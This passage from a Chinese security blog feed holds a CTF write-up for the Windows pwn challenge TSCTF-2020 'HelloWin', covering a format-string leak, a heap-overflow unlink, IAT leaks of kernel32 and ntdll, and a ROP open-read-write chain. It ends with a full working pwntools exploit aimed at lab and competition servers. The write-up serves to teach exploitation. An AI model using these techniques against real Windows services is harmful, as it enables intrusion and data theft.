punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 从0学习路由器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TSCTF-2020-HelloWin</title>
      <link href="/2021/01/04/tsctf-2020-hellowin/"/>
      <url>/2021/01/04/tsctf-2020-hellowin/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="保护机制分析"><a href="#保护机制分析" class="headerlink" title="保护机制分析"></a>保护机制分析</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/0.png"></div>常见的几个保护都开启了。<h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><p>主函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/1.png"></div>在进入菜单题目之前有个格式化字符串：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/2.png"></div>但是跟常规的好像不太一样，通过测试发现的确是格式化字符串：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/3.png"></div>后面是一个常规的菜单题目，create、delete、show、edit。出题人很贴心的给出了漏洞存在的函数位置，也就是名为overflow的edit功能：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/4.png"></div>size没有检查，可以向后溢出。# 思路<p>通过学习wp才知道，这道题目是禁止执行system(“cmd.exe”)的：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/5.png"></div><p>windows有个点是，只要系统不重启，那么加载的libc地址在一段时间内是不变的，这是因为关闭地址随即化的原因吗？也就是说我们可以先泄露libc等地址，然后再close，再attach上去利用这些地址。</p><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><p>第一步：格式化字符串打印出寄存器中的内容：windows中的参数传递与linux中的不同，其通过RCX,RDX,R8,R9,stack传递参数。在即将执行printf(%p%p%p%p%p)的时候</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/6.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/7.png"></div>按道理会打印出这几个寄存器的值和栈第一个地址的值。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/8.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/9.png"></div><p>但实际打出的确是rdx、r8、r9和栈偏移0x20处的值，我们可以通过加载基址看到这几个值分别是ucrtbase的基址，第二三个是stack的基址，第四个是个堆地址，第五个是image的基址</p><p>第二步：通过堆溢出构造unlink：<br>由于程序在edit的时候没有检查size大小，同时我们已经得知heap地址，那么通过这些信息我们可以考虑构造unlink攻击：以实现任意地址读写的目的：</p><p>由于chunk的header会被xor计算：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/10.png"></div>所以我们需要泄露出free的header，然后才能写fd和bk：<p>我们看看unlink前的内存布局：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/11.png"></div>unlink后：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/12.png"></div><p>第三步：由于我们获得了stack地址与根据main函数返回的esp来算绝对偏移，得到main函数的返回地址，进行rop即可。但是我们需要找到需要的gadget，其中ucrtadll只有orw函数和部分我们需要的gadgets。其它的gadgets我们通过查找在ntdll库中，所以我们还需要找到ntdll的基址。</p><p>根据exp我们看到，ntdll的地址可以通过kernel32的中的IAT表泄露，而kernel32的地址则可以通过image的IAT表泄露。</p><p>image IAT表</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/13.png"></div><p>kernel32 IAT表</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/14.png"></div><p>第四步：写rop<br>首先调用syscall行不通，所以只能一步一步执行函数，又因为执行函数的时候会破坏掉栈部分数据，所以我i们尽可能的在函数调用的后面准备pop寄存器+p64(0)*n 这样的数据不容易被破坏掉。最后在调用write的时候，跳过一些开始mov [rsp+n],xxx的指令，否则由于栈的异常会报错。（最后得知是write+0xe）</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/04/tsctf-2020-hellowin/15.png"></div><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>          <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims             <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"192.168.241.134"</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.70.197.50"</span><span class="token punctuation">,</span><span class="token number">9010</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./student_manager"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"ready?\r\n"</span><span class="token punctuation">,</span><span class="token string">"Yes,me is!!!"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"name:\r\n"</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"password:\r\n"</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"]\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size:\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content:\r\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"]\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index:\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"]\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index:\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size:\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"content:\r\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"]\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"index:\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">magic</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"*****]\r\n"</span><span class="token punctuation">,</span> <span class="token string">"88"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input index:\r\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"]\r\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># step 1 leak urctbase , stack, heap , image base</span>sla<span class="token punctuation">(</span><span class="token string">"ready?\r\n"</span><span class="token punctuation">,</span><span class="token string">"Yes,me is!!!"</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">"name:\r\n"</span><span class="token punctuation">,</span><span class="token string">"%p%p%p%p%p"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Hello! "</span><span class="token punctuation">)</span>ucrtbase_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffb4a59b750</span><span class="token operator">+</span><span class="token number">0x7ffb4a4b0000</span>success<span class="token punctuation">(</span><span class="token string">"ucrtbase_base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ucrtbase_base<span class="token punctuation">)</span><span class="token punctuation">)</span>stack1 <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack1 ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack1<span class="token punctuation">)</span><span class="token punctuation">)</span>stack2 <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"stack2 ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack2<span class="token punctuation">)</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"heap addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>image_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1b4a</span>success<span class="token punctuation">(</span><span class="token string">"image base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>image_base<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># step 2 leak freed heap header and unlink</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"192.168.241.134"</span><span class="token punctuation">,</span><span class="token number">8888</span><span class="token punctuation">)</span>start<span class="token punctuation">(</span><span class="token string">"bluesheep"</span><span class="token punctuation">,</span><span class="token string">"bluesheep"</span><span class="token punctuation">)</span>heap_list <span class="token operator">=</span> image_base<span class="token operator">+</span><span class="token number">0x6620</span>ret_addr <span class="token operator">=</span> stack2 <span class="token operator">-</span> <span class="token number">0x14f7a1</span> <span class="token operator">+</span> <span class="token number">0x14fee8</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token punctuation">)</span>heap_header <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"heap header ==>"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>heap_header<span class="token punctuation">)</span><span class="token punctuation">)</span> delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x58</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_header<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_list<span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_list<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>magic<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># step 3  leak kernel32 base , ntdll base according IAT table</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_list<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>image_base<span class="token operator">+</span><span class="token number">0x3000</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>kernel_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffb4d36ec80</span><span class="token operator">+</span><span class="token number">0x7ffb4d350000</span>success<span class="token punctuation">(</span><span class="token string">"kernel32 base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>kernel_base<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_list<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>kernel_base<span class="token operator">+</span><span class="token number">0x79f80</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>ntdll_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffb4d5877d0</span><span class="token operator">+</span><span class="token number">0x7ffb4d570000</span>success<span class="token punctuation">(</span><span class="token string">"ntdll base ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>ntdll_base<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_list<span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">"content: "</span><span class="token punctuation">)</span>flag_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"flag addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>flag_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># step 4 rop: orw get flag</span>open_addr <span class="token operator">=</span> ucrtbase_base<span class="token operator">+</span><span class="token number">0xa28c0</span>read_addr <span class="token operator">=</span> ucrtbase_base<span class="token operator">+</span><span class="token number">0x15990</span>write_addr <span class="token operator">=</span> ucrtbase_base<span class="token operator">+</span><span class="token number">0x15310</span>pop_rcx_ret <span class="token operator">=</span> ucrtbase_base<span class="token operator">+</span><span class="token number">0x29e60</span>pop_r8_ret <span class="token operator">=</span> ntdll_base<span class="token operator">+</span><span class="token number">0x648e3</span>pop_rdx_r11 <span class="token operator">=</span> ntdll_base<span class="token operator">+</span><span class="token number">0x8f557</span> <span class="token comment" spellcheck="true"># pop rdx; pop r11; ret; </span>pop_5 <span class="token operator">=</span> ntdll_base<span class="token operator">+</span><span class="token number">0x6b092</span><span class="token comment" spellcheck="true">#pop rax; pop r14; pop r13; pop rsi; pop rbx; ret; </span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span>b<span class="token string">".\\flag.txt"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> b<span class="token string">"\x00"</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">"\n"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x38</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_list<span class="token operator">+</span><span class="token number">0x18</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pop_rcx_ret<span class="token punctuation">,</span>flag_addr<span class="token punctuation">,</span>pop_rdx_r11<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        open_addr<span class="token punctuation">,</span>        pop_5<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        pop_rcx_ret<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>        pop_rdx_r11<span class="token punctuation">,</span>flag_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>pop_r8_ret<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>        read_addr<span class="token punctuation">,</span>        pop_5<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>        pop_rcx_ret<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>pop_rdx_r11<span class="token punctuation">,</span>flag_addr<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>pop_r8_ret<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span>        write_addr<span class="token operator">+</span><span class="token number">0xe</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># raw_input()</span>edit<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>rop<span class="token punctuation">)</span><span class="token punctuation">,</span>rop<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            